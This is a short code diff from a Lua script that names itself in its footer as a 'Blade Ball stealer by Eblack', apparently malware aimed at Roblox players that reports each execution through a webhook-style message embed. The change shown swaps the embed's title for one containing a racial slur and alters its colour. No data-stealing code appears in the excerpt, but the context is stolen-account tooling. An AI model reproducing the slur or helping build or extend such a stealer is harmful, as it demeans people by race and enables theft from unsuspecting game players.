@@ -287,8 +287,8 @@ local function SendMessage(list)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 New Blade Ball Execution" ,
-            ["color"] = 65280,
+            ["title"] = "\240\159\148\180 The nigga is on the server \240\159\169\190" ,
+            ["color"] = 8323327,
 			["fields"] = fields,
 			["footer"] = {
 				["text"] = "Blade Ball stealer by Eblack"
